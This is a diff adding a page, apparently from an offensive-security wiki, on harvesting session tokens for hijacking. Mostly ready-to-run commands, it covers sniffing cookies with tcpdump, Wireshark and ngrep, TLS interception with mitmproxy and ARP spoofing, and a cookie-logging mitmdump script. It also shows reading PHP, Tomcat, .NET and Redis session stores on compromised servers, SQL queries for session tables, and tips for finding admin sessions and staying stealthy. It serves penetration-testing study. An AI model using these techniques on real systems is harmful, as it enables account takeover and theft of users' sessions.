@@ -1,0 +1,454 @@
+---
+title: Obtaining Tokens
+description: Harvesting session identifiers without user interaction - passive network sniffing with Wireshark/tcpdump, mitmproxy for TLS-MitM, post-exploit retrieval from PHP/Java/.NET session stores, and database extraction from sessions tables.
+mitre: [T1557, T1539, T1213, T1083]
+d3fend: [D3-NTA, D3-FIM]
+impact: [SessionTakeover, CredentialTheft]
+owasp: [A02, A07]
+sidebar:
+  order: 4
+  label: Obtaining Tokens
+---
+
+## TL;DR
+
+Before you can hijack a session, you need the identifier. Four harvest paths, each with different prerequisites:
+
+```
+# 1. Passive sniffing - plaintext HTTP on a network you control
+sudo tcpdump -i eth0 -A -s0 'tcp port 80' | grep -i 'auth-session\|PHPSESSID\|JSESSIONID'
+# Or: sudo wireshark, filter http, search packet bytes
+
+# 2. Active MitM - TLS via fake cert (warns the victim unless you've planted your CA)
+mitmproxy -p 8080
+# (combined with ARP spoofing, DNS spoofing, or PAC injection to route victim through you)
+
+# 3. Post-exploitation - files on a compromised app server
+ls /var/lib/php/sessions/                # PHP default
+cat /var/lib/php/sessions/sess_<id>      # session file contents
+find / -name 'SESSIONS.ser' 2>/dev/null  # Tomcat
+ls "C:\inetpub\temp\IIS Temporary..."    # .NET InProc
+
+# 4. Database - compromised DB with sessions table
+SELECT * FROM sessions;                  # generic
+SELECT * FROM django_session;            # Django
+SELECT id, payload FROM sessions;        # Laravel (base64-encoded payload)
+```
+
+Success indicator: a valid, current session identifier in hand, ready for hijacking.
+
+## The four harvest categories
+
+| Category | Prereq | Detection signal |
+| --- | --- | --- |
+| Passive sniffing | Network position + plaintext traffic | None on the wire - perfectly passive |
+| Active MitM | Network position + TLS-defeating capability | Browser cert warnings (unless CA installed) |
+| Post-exploit retrieval | Code execution on the app server | Filesystem audit logs |
+| Database extraction | DB read access | DB query logs |
+| XSS exfiltration | Stored or reflected XSS + HttpOnly not set | Outbound request to attacker domain (see [XSS to Session](/codex/web/sessions/xss-to-session/)) |
+| Open redirect token leak | Open redirect + tokens travel in URLs/POSTs | Outbound request to attacker domain (see [Open Redirect](/codex/web/sessions/open-redirect/)) |
+
+This page covers the first four. XSS and open redirect get their own pages because their mechanics are richer.
+
+## Sniffing with Wireshark
+
+Wireshark is the canonical packet capture and analysis tool. For session-cookie harvesting:
+
+```shell
+sudo -E wireshark
+```
+
+(`-E` preserves the environment so the GUI launches with X11 access when run from a user shell with sudo.)
+
+### Interface selection
+
+Pick the interface that sees the victim's traffic:
+
+- `eth0` / `enp*s*` - wired Ethernet on attacker's host
+- `wlan0` / `wlp*s*` - wireless (only sees broadcast / your own; rarely useful unless you're on the same SSID and the AP isn't isolating clients)
+- `tun0` - VPN tunnel (useful in HTB-style lab environments where the lab is on a shared tun network)
+- `lo` - loopback (only useful if you're proxying victim traffic to localhost first)
+
+For a real on-network attack, the interface needs to be in promiscuous mode and you need ARP spoofing (with `arpspoof` / `ettercap`) to redirect victim traffic through you - or you're on a hub-like network (rare in 2024).
+
+### Filtering for sessions
+
+Wireshark's display filter (top bar) accepts BPF-like syntax. The useful filters:
+
+| Filter | Effect |
+| --- | --- |
+| `http` | All HTTP traffic |
+| `http.cookie` | Requests with Cookie headers |
+| `http.set_cookie` | Responses with Set-Cookie headers |
+| `http contains "auth-session"` | Substring match on packet payload |
+| `http.host == "target.com"` | Requests to a specific host |
+| `tcp.port == 80` | Plaintext HTTP TCP traffic |
+
+Once filtered, click any packet, scroll to the `Hypertext Transfer Protocol` section, expand the headers, and the cookie value is visible in plain text.
+
+### Search by string
+
+Edit → Find Packet → "Packet bytes" → "String" → enter `auth-session` or whatever the cookie name is. Wireshark jumps to the first match. Press `Ctrl+N` to find the next.
+
+To copy the cookie value: right-click the cookie line in the packet detail → Copy → Value.
+
+## Sniffing with tcpdump
+
+For headless/SSH sessions where Wireshark's GUI isn't available:
+
+```shell
+# Capture full HTTP traffic to file
+sudo tcpdump -i eth0 -w /tmp/capture.pcap 'tcp port 80'
+
+# Live tail of plaintext HTTP with payload
+sudo tcpdump -i eth0 -A -s0 'tcp port 80'
+
+# Filter for cookies in real-time
+sudo tcpdump -i eth0 -A -s0 'tcp port 80' \
+  | grep -A2 -i 'cookie:'
+```
+
+Flags:
+
+- `-i eth0` - interface
+- `-A` - print ASCII payload
+- `-s0` - full packet (no truncation)
+- `-w file.pcap` - write to pcap, open in Wireshark later
+
+For a focused capture targeting a specific host:
+
+```shell
+sudo tcpdump -i eth0 -A -s0 'tcp port 80 and host target.com'
+```
+
+### Reading the capture file
+
+```shell
+# Quick text-based session extraction
+tshark -r capture.pcap -Y 'http.cookie' \
+       -T fields -e http.cookie -e http.host
+
+# Or use ngrep for grep-style on packets
+sudo ngrep -d eth0 -W byline 'auth-session' 'tcp port 80'
+```
+
+`ngrep` is the simplest tool when you know exactly what you're looking for and just want it on stdout.
+
+## Active MitM with mitmproxy
+
+`mitmproxy` is the standard tool for actively decrypting TLS traffic. Two pre-conditions:
+
+1. **Routing** - victim traffic has to go through your machine (via PAC file, ARP spoofing, malicious WiFi AP, network compromise)
+2. **Trust** - victim's browser has to trust your CA cert, OR you must accept that the browser will warn the victim ("Your connection is not secure")
+
+### Setup
+
+```shell
+# Run mitmproxy on port 8080
+mitmproxy -p 8080
+```
+
+The interactive UI shows every request as it flows through. Sessions / cookies are visible per-request in the Headers tab.
+
+### Installing the CA on the victim
+
+If you're running an attack in your own lab (penetration test with consent):
+
+```
+http://mitm.it
+```
+
+Browse to this URL with the victim's browser while proxied through mitmproxy. Download the CA cert for the OS / browser, install it as trusted. Now mitmproxy can transparently decrypt TLS - no warning at all.
+
+In a hostile-network red-team context, "installing the CA" usually means social engineering ("install this corporate certificate"), endpoint compromise (planting the cert in trusted-roots), or no installation at all (accept the warnings and rely on the user to dismiss them).
+
+### Filtering for cookies in mitmproxy
+
+Inside mitmproxy, use the filter `~h "cookie"` to show only requests with a Cookie header. The interactive UI then lets you press `Enter` on any request to see the full headers.
+
+For automated harvesting:
+
+```shell
+# Headless mitmdump with a custom script
+mitmdump -p 8080 -s extract_cookies.py
+```
+
+```python
+# extract_cookies.py
+def request(flow):
+    cookie = flow.request.headers.get("cookie", "")
+    if cookie:
+        print(f"[{flow.request.host}] {cookie}")
+```
+
+Every request through the proxy now logs its cookie header.
+
+## Post-exploitation retrieval
+
+Once you have code execution on the application server (via RCE, webshell, SSH key compromise, etc.), session stores are usually on disk in known locations. Read them, get every active user's cookie at once.
+
+### PHP
+
+Default config:
+
+```
+session.save_handler = files
+session.save_path    = "/var/lib/php/sessions"
+```
+
+(Confirm with `cat /etc/php/*/apache2/php.ini | grep session.save_path` or `php -i | grep session.save_path`.)
+
+Session files are named `sess_<SESSIONID>`:
+
+```shell
+$ ls /var/lib/php/sessions/
+sess_s6kitq8d3071rmlvbfitpim9mm
+sess_a7m2nf2qb921ssm0adlvqkj9oo
+sess_e1f3oo5xk071enmzbflv5kp8dd
+```
+
+The filename `sess_<X>` tells you the session cookie value is `<X>`. So:
+
+```shell
+# Every active session, as cookie name=value pairs
+$ ls /var/lib/php/sessions/ | grep ^sess_ | sed 's/^sess_/PHPSESSID=/'
+PHPSESSID=s6kitq8d3071rmlvbfitpim9mm
+PHPSESSID=a7m2nf2qb921ssm0adlvqkj9oo
+PHPSESSID=e1f3oo5xk071enmzbflv5kp8dd
+```
+
+The session file content tells you whose session it is:
+
+```shell
+$ cat /var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
+user|s:5:"admin";logged_in|b:1;email|s:18:"admin@example.com";
+```
+
+PHP serializes session data with its own format. The above means:
+
+- `user` (string, 5 chars): "admin"
+- `logged_in` (bool): 1 (true)
+- `email` (string, 18 chars): "admin@example.com"
+
+This is the admin's session. Take the cookie value (`s6kitq8d3071rmlvbfitpim9mm`), use it from your browser → admin.
+
+### Hunting for the highest-value session
+
+```shell
+# Find sessions with admin/role/privilege markers
+$ grep -lE 'admin|role.*1|is_admin.*b:1' /var/lib/php/sessions/sess_*
+/var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
+
+# Show file modification times - recently active = recently logged-in
+$ ls -lt /var/lib/php/sessions/sess_* | head -10
+```
+
+Recent files are active users. Match against grep for admin-y content and you've found high-value targets.
+
+### Java / Tomcat
+
+Tomcat's default session manager keeps sessions in memory, *persisted* to disk on shutdown to `<CATALINA_BASE>/work/Catalina/<host>/<context>/SESSIONS.ser`:
+
+```shell
+$ find / -name 'SESSIONS.ser' 2>/dev/null
+/opt/tomcat/work/Catalina/localhost/myapp/SESSIONS.ser
+```
+
+`SESSIONS.ser` is a Java serialized blob - not directly readable as text. Tools:
+
+```shell
+# Try `strings` first - sometimes session attributes are stored as Java strings
+strings /opt/tomcat/work/Catalina/localhost/myapp/SESSIONS.ser \
+  | grep -iE 'JSESSIONID|user|admin|token'
+```
+
+For full parsing, you need a Java deserializer that understands Tomcat's `StandardSession`. Tools like `ysoserial`'s payload-generation crowd or custom Java code are needed.
+
+For active sessions (not just the persisted snapshot), they live in JVM memory - you'd need a memory dump (`jmap`, `gcore`) and a Java deserializer to walk the heap. Out of scope for normal session harvesting.
+
+#### Tomcat manager interface
+
+Many Tomcat deployments expose `/manager/html` with admin/manager credentials. If you have access there, the "Sessions" subpage lists active session IDs:
+
+```
+http://target/manager/html
+```
+
+Active session IDs are visible per-application. No serialized-blob parsing required.
+
+### .NET
+
+ASP.NET has three session storage modes (controlled by `<sessionState mode="...">`):
+
+| Mode | Storage | Retrieval path |
+| --- | --- | --- |
+| **InProc** | IIS worker process memory (`w3wp.exe` or `aspnet_wp.exe`) | Memory dump of the worker process |
+| **StateServer** | A Windows service (`aspnet_state`) on the same host or a separate one | Connect to TCP 42424 (default state-service port) or dump the state-service process |
+| **SQLServer** | A SQL Server database (table `ASPStateTempSessions`) | SQL query against that DB |
+| **Custom** | Whatever the app implements | Read the app's code to find the store |
+
+#### InProc mode
+
+```cmd
+# Find the IIS worker process PID
+> tasklist /FI "IMAGENAME eq w3wp.exe"
+
+# Dump the process memory
+> procdump -ma <PID> w3wp.dmp
+
+# Strings on the dump
+> strings w3wp.dmp | findstr /i "ASP.NET_SessionId"
+```
+
+This recovers session IDs from active in-memory sessions. The session data is serialized in a format you may need to parse with `Sscanf`/`BinaryFormatter` knowledge.
+
+#### SQLServer mode
+
+```sql
+SELECT SessionId, Created, Expires, LockDateLocal, SessionItemShort
+FROM ASPStateTempSessions
+WHERE Expires > GETDATE();
+```
+
+`SessionItemShort` is a `varbinary` blob; for sessions over 7000 bytes, content overflows to `SessionItemLong`. The blob is the `BinaryFormatter`-serialized session - same parsing concerns as in-memory mode.
+
+For session-cookie hijacking, often you don't need to parse the blob at all - `SessionId` alone is enough. Take that value and use it as the `ASP.NET_SessionId` cookie.
+
+### Node.js (Express / connect-session)
+
+Default storage is in-memory (process-local). Distributed apps use:
+
+- `connect-redis` - sessions stored in Redis
+- `connect-mongo` - in MongoDB
+- `connect-session-sequelize` - in SQL via Sequelize
+
+Hunt for the store first:
+
+```shell
+# Redis (default port 6379, often no auth)
+redis-cli
+> KEYS sess:*
+> GET sess:abc123
+"{\"user\":\"admin\",\"logged_in\":true}"
+
+# MongoDB
+mongo
+> use myapp
+> db.sessions.find({}).pretty()
+```
+
+### Other frameworks
+
+| Framework | Default store path |
+| --- | --- |
+| Django | DB table `django_session` (default) or file `/var/lib/django/sessions/` |
+| Rails | DB table `sessions` (legacy) or signed cookies (modern) |
+| Laravel | `storage/framework/sessions/` (file) or DB `sessions` table |
+| Flask | Signed cookies (no server-side store by default) - see [Auth: session fixation](/codex/web/auth/session-fixation/) for sig-forgery |
+| Symfony | `/var/cache/<env>/sessions/` |
+
+When in doubt, check the framework's config files for `session_store` or `SESSION_*` env vars.
+
+## Database extraction
+
+When you have SQL access via injection or stolen DB credentials:
+
+```sql
+-- Generic table discovery
+SHOW TABLES;       -- MySQL
+\dt                -- PostgreSQL
+.tables            -- SQLite
+SELECT name FROM sysobjects WHERE xtype='U';  -- MSSQL
+
+-- Look for sessions
+SELECT * FROM sessions;
+SELECT * FROM user_sessions;
+SELECT * FROM auth_sessions;
+SELECT * FROM all_sessions;
+SELECT * FROM django_session;
+```
+
+If the table is named ambiguously, look for columns that smell like session columns:
+
+```sql
+-- Postgres / generic
+SELECT table_name, column_name
+FROM information_schema.columns
+WHERE column_name ILIKE '%session%' OR column_name ILIKE '%token%';
+```
+
+### Reading the row
+
+Once you have rows, the cookie value is typically in a column named `id`, `session_id`, `key`, or `payload`:
+
+```sql
+SELECT id, user_id, payload FROM sessions WHERE user_id = 1;
+```
+
+If `payload` is a serialized blob (PHP serialize, base64-encoded JSON, Java-serialized object), the meaningful data is inside but the cookie value you need is the `id` column.
+
+### Django specifically
+
+```sql
+SELECT session_key, session_data, expire_date FROM django_session
+WHERE expire_date > NOW();
+```
+
+`session_key` is the cookie value. `session_data` is a base64-encoded, signed-then-pickled (or signed-then-JSON) blob. The cookie value (`session_key`) is enough for hijacking - you don't need to decode the data.
+
+### Laravel specifically
+
+```sql
+SELECT id, user_id, payload, last_activity FROM sessions
+ORDER BY last_activity DESC;
+```
+
+The cookie name is `laravel_session` and the cookie value is the `id` column (after URL-decoding the Laravel-encrypted-cookie wrapper, which is annoying - see Laravel's `app_key` handling for details).
+
+## Operational practices
+
+### Always work in a private window or fresh profile
+
+When you harvest a cookie and want to test it, open a private/incognito window. Mixing the victim's cookie into your normal browser's cookie jar confuses both you and the app.
+
+### Time-bound harvesting
+
+Sessions expire. Recently-modified session files / recently-written DB rows are most likely to still be valid. Older ones are likely expired even if they're still on disk (some frameworks don't clean up until next request).
+
+### Multiple sessions per user
+
+Apps that allow concurrent sessions store multiple records per user. Find the one for the target device:
+
+- IP address column (if present) - match to the victim's known IP
+- User-agent column - match to the device they're known to use
+- Last activity column - most recent is most likely active
+
+### Quietness
+
+Post-exploitation harvesting is loud:
+
+- Reading every session file takes I/O
+- DB queries on session tables show up in DB logs
+- mitmproxy / Wireshark are visible to anyone running an IDS
+
+For stealth: minimize, target specific known-victim sessions if you know who you want, do passive sniffing where possible, avoid bulk-reading entire session directories.
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Wireshark GUI | `sudo -E wireshark`, filter `http.cookie` |
+| tcpdump full payload | `sudo tcpdump -i eth0 -A -s0 'tcp port 80'` |
+| ngrep for a pattern | `sudo ngrep -d eth0 -W byline 'auth-session' 'tcp port 80'` |
+| Read pcap for cookies | `tshark -r cap.pcap -Y http.cookie -T fields -e http.cookie` |
+| mitmproxy interactive | `mitmproxy -p 8080` |
+| mitmproxy scripted | `mitmdump -p 8080 -s extract.py` |
+| PHP session files | `ls /var/lib/php/sessions/sess_*` |
+| PHP find admin sessions | `grep -lE 'admin\|is_admin' /var/lib/php/sessions/sess_*` |
+| Tomcat sessions on disk | `find / -name SESSIONS.ser 2>/dev/null` |
+| .NET InProc dump | `procdump -ma <w3wp PID> dump.dmp` |
+| .NET SQLServer mode | `SELECT SessionId FROM ASPStateTempSessions WHERE Expires > GETDATE()` |
+| Redis session store | `redis-cli KEYS 'sess:*'` |
+| Django sessions | `SELECT session_key FROM django_session WHERE expire_date > NOW()` |
+| Laravel sessions | `SELECT id, user_id FROM sessions ORDER BY last_activity DESC` |
+| Generic discovery | `SELECT table_name, column_name FROM information_schema.columns WHERE column_name ILIKE '%session%'` |
